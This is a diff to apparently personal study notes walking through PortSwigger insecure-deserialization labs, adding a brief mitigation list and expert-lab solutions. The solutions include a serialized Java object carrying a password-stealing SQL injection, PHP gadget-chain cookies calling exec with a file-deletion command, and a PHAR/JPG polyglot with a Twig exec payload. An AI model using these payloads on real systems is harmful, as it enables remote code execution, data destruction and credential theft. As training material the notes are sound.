@@ -2659,6 +2659,12 @@ encoded as ac ed in hexadecimal and rO0 in Base64
 java.io.Serializable; readObject(); InputStream
 ```
 
+**Mitigation**
+- Avoid Using __sleep() and __wakeup() Magic Methods Unnecessarily
+- Validate and Sanitize Serialized Data
+- use JSON encoding/decoding (`json_encode` and `json_decode`) instead of PHP serialization (`serialize` and `unserialize`).
+- Use Signed and Encrypted Serialized Data  `$signature = hash_hmac('sha256', $data, $secret_key);`
+
 ### Insecure Deserialization Lab
 - Modifying serialized **objects**
   - session cookies decoded from Base64 `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
@@ -2729,7 +2735,30 @@ java.io.Serializable; readObject(); InputStream
   - change the "id" to "rm /home/carlos/morale.txt"
   - replace last 2 lines with "puts Base64.encode64(payload)"
   - Run it and copy the output to session cookie  
-- Developing a **custom gadget chain for Java deserialization** (Expert)
+- Developing a **custom gadget chain for Java deserialization (Expert)**
+  - Navigate the sitemap and discover the source code
+    ```
+    sitemap
+	/backup/AccessTokenUser.java
+	
+	GET /backup
+	/backup/ProductTemplate.java
+	
+	 public ProductTemplate(String id)
+	    {
+	        this.id = id;
+	    }
+	
+	Connection connect = connectionBuilder.connect(30);
+	            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
+	            Statement statement = connect.createStatement();
+	            ResultSet resultSet = statement.executeQuery(sql);
+	            if (!resultSet.next())
+	            {
+	                return;
+	            }
+	            product = Product.from(resultSet);
+    ```
   - Download https://github.com/PortSwigger/serialization-examples/tree/master/java/solution
   - Modify main.java
     ```
@@ -2745,7 +2774,43 @@ java.io.Serializable; readObject(); InputStream
       Deserialized object ID: ' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
     ```
   - Replace the cookie session with this serialized object
-- Developing a **custom gadget chain for PHP deserialization** (Expert)
+- Developing a **custom gadget chain for PHP deserialization (Expert)**
+  - discover the source code `GET /cgi-bin/libs/CustomTemplate.php~`
+  - Potential Payload Insertion Points
+    - `__sleep()` and `__wakeup()` Methods in CustomTemplate: These magic methods are often targeted during serialization/deserialization attacks, such as PHP object injection
+    - `__get()` method in the DefaultMap class can be exploited if a vulnerable callback function is passed to the constructor. This could lead to remote code execution
+    - session cookie `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"q4h5oyk9vfnj1qsl7vrwddiluej4vlhy";}`
+    - modified payload "customTemplate", "default_desc_type", "DefaultMap"  
+      `O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`
+- Using **PHAR deserialization to deploy a custom gadget chain (Expert)**
+  - Explore Site map
+    ```
+    GET /cgi-bin/
+	CustomTemplate.php~
+	Blog.php~
+    ```
+  - Study the source code
+    ```
+    study the source code
+    private function isTemplateLocked() {
+        return file_exists($this->lockFilePath());
+    }
+    ```
+  - create a jpg file https://github.com/kunte0/phar-jpg-polyglot
+  - Edit the phar_jpg_polyglot.php and run it to create the polyglot with phar inside
+    ```
+    // pop exploit class
+	class CustomTemplate {}
+	class Blog {}
+	$object = new CustomTemplate;
+	$blog = new Blog;
+	$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+	$blog->user = 'carlos';
+	$object->template_file_path = $blog;
+    ```
+  - php -c php.ini phar_jpg_polyglot.php
+  - Upload the avadar https://github.com/PortSwigger/serialization-examples/tree/master/php/phar-jpg-polyglot.jpg
+  - GET /cgi-bin/avatar.php?avatar=phar://wiener
 
 ## Web LLM Attacks
 Content for Web LLM Attacks...
